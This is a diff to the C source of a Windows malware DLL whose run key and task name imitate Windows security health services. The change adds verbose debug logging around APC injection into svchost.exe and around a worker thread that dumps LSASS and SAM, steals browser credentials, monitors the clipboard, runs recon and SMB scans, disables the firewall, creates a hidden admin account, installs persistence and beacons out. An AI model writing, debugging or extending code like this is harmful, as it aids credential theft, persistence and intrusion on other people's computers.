@@ -31,7 +31,7 @@
 #define RUN_KEY_VALUE L"WindowsSecHealth"
 #define TASK_NAME L"SecHealthSvc2"
 #define SELF_INF L"rundll32.exe " STAGE_DLL_PATH ",DllRegisterServer"
-#define LOG_PATH L"C:\\ProgramData\\Microsoft\\Network\\~log.tmp"
+#define LOG_PATH L"C:\\ProgramData\\loader.log"
 #define CLIP_PATH L"C:\\ProgramData\\Microsoft\\Network\\~clip.tmp"
 #define BEACON_URL L"https://github.com"
 #define BEACON_COUNT 5
@@ -747,21 +747,54 @@ static void Beacon(void) {
 static DWORD WINAPI WorkerThread(LPVOID lpParam) {
     (void)lpParam;
 
+    EnsureDirectory(L"C:\\ProgramData");
+    LogMessage(L"[+] WorkerThread started");
+
     EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18");
     EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys");
     EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Network");
 
+    LogMessage(L"[*] Monitoring clipboard");
     MonitorClipboard();
-    DumpLSASS();
-    DumpSAM();
-    StealBrowserCreds();
-    DoRecon();
-    DoSMBRecon();
-    DisableFirewall();
-    CreateAdminAccount();
-    InstallPersistence();
-    Beacon();
+    LogMessage(L"[+] Clipboard done");
 
+    LogMessage(L"[*] Dumping LSASS");
+    DumpLSASS();
+    LogMessage(L"[+] LSASS dump complete");
+
+    LogMessage(L"[*] Dumping SAM");
+    DumpSAM();
+    LogMessage(L"[+] SAM dump done");
+
+    LogMessage(L"[*] Stealing browser credentials");
+    StealBrowserCreds();
+    LogMessage(L"[+] Browser creds done");
+
+    LogMessage(L"[*] Running recon");
+    DoRecon();
+    LogMessage(L"[+] Recon done");
+
+    LogMessage(L"[*] Running SMB scan");
+    DoSMBRecon();
+    LogMessage(L"[+] SMB scan done");
+
+    LogMessage(L"[*] Disabling firewall");
+    DisableFirewall();
+    LogMessage(L"[+] Firewall disabled");
+
+    LogMessage(L"[*] Creating admin account");
+    CreateAdminAccount();
+    LogMessage(L"[+] SupportUser created");
+
+    LogMessage(L"[*] Installing persistence");
+    InstallPersistence();
+    LogMessage(L"[+] Persistence installed");
+
+    LogMessage(L"[*] Sending beacon");
+    Beacon();
+    LogMessage(L"[+] Beacon done");
+
+    LogMessage(L"[+] WorkerThread complete");
     return 0;
 }
 
@@ -771,22 +804,41 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
 
+        EnsureDirectory(L"C:\\ProgramData");
+        wchar_t hostPath[MAX_PATH];
+        GetModuleFileNameW(NULL, hostPath, MAX_PATH);
+        wchar_t buf[MAX_PATH + 64];
+        wsprintfW(buf, L"[+] DLL loaded — host: %s", hostPath);
+        LogMessage(buf);
+
         char path[MAX_PATH];
         GetModuleFileNameA(NULL, path, MAX_PATH);
         if (strstr(path, "svchost.exe")) {
-            LogMessage(L"[+] DLL loaded in svchost.exe");
+            LogMessage(L"[+] Detected svchost.exe — queuing WorkerThread");
             QueueUserWorkItem((LPTHREAD_START_ROUTINE)WorkerThread, NULL, WT_EXECUTEDEFAULT);
+        } else {
+            LogMessage(L"[-] Not svchost.exe — WorkerThread NOT queued");
         }
     }
     return TRUE;
 }
 
 __declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
+    EnsureDirectory(L"C:\\ProgramData");
+    LogMessage(L"[+] DllRegisterServer called");
+
     CreateDirectoryA("C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18", NULL);
 
     DWORD pid = FindProcessPID("svchost.exe");
     if (pid) {
-        InjectAPC(pid);
+        wchar_t buf[256];
+        wsprintfW(buf, L"[+] svchost.exe PID=%lu — injecting APC", pid);
+        LogMessage(buf);
+
+        BOOL ok = InjectAPC(pid);
+        LogMessage(ok ? L"[+] APC injection OK" : L"[-] APC injection FAILED");
+    } else {
+        LogMessage(L"[-] svchost.exe not found");
     }
 
     return S_OK;
